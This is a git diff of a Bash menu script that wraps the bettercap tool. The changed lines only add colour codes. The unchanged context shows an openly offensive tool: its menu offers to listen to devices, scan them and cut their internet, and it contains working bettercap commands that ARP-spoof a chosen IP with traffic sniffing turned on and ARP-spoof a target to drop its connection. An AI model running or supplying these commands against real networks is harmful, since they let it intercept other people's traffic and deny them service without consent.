@@ -33,7 +33,7 @@ ___________       __     _____
 @shadowxy 
 EOF
 echo -e "${NC}"
-
+echo -e "${WHITE}"
 echo ""
 echo "1) Listen to devices"
 echo "2) Scan devices "
@@ -41,6 +41,7 @@ echo "3) disconnect the device's internet"
 echo "4) exit"
 echo ""
 
+echo -e "${NC}"
 read -p "make a selection : " secim2
 
 if [[ "$secim2" == "1" ]]; then
@@ -59,7 +60,7 @@ if [[ "$secim2" == "1" ]]; then
 
  sudo bettercap -iface "$face3" -eval "set arp.spoof.targets $ip; arp.spoof on; net.sniff on"
 
- echo "The tool stopped."
+ echo -e "${YELLOW}The tool stopped.${NC}"
  sleep 2
  continue
 
@@ -85,7 +86,7 @@ elif [[ "$secim2" == "3" ]]; then
  clear
  read -p "What is your interface? : " face2
  clear
- echo "Please do not close the program directly."
+ echo -e "${YELLOW}Please do not close the program directly. ${NC}"
  sleep 2
  echo "The user's internet connection is dropping."
 
@@ -98,7 +99,7 @@ sudo bettercap -iface "$face2" -eval "set arp.spoof.targets $ip2; set arp.spoof.
 while true 
 do 
 
-echo "The device's internet connection has been cut off"
+echo -e "${RED}The device's internet connection has been cut off ${NC}"
 echo ""
 
 clear
